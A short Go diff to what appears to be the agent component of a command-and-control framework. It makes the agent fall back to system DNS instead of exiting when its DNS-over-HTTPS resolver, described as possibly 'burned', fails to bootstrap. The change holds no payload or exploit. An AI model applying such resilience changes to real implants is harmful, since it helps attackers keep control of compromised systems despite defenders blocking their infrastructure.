@@ -114,13 +114,16 @@ func agent_main() {
 
 	// DNS
 	if common.RuntimeConfig.DoHServer != "" {
-		// use DoH resolver
-		net.DefaultResolver, err = dns.NewDoHResolver(
+		// use DoH resolver. Bootstrap (resolving the DoH server's own hostname)
+		// can fail when the DoH host is dead/burned; degrade to the system
+		// resolver instead of panicking later on a nil DefaultResolver.
+		if resolver, dnsErr := dns.NewDoHResolver(
 			common.RuntimeConfig.DoHServer,
 			dns.DoHCache(),
-		)
-		if err != nil {
-			logging.Fatal(err)
+		); dnsErr != nil || resolver == nil {
+			logging.Warningf("DoH bootstrap failed (%v), falling back to system DNS", dnsErr)
+		} else {
+			net.DefaultResolver = resolver
 		}
 	}
 
